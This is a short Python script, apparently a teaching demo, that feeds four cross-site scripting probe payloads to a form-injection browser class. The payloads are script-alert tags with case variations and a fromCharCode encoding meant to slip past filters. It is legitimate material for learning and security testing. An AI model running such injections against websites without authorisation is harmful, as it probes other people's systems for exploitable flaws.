#!/usr/bin/python
# coding:utf-8
# @author:pengfei filename: xss.py

'''
	To demonstrate how to dig xss with python code
'''

from webBrowser import FormInjectionBrowser


if __name__=="__main__":

	injectData = ['<script>alert("XSS")</script>',
		      '<SCRIPT>alert("XSS")</SCRIPT>',
		      '<ScRiPT>alert("XSS")</script>',
		      '<script>alert(String.fromCharCode(88,83,83))</script>']
	expectData = [ item for item in injectData]

	fi = FormInjectionBrowser(injectData,expectData)
	fi.inject()
	fi.close()


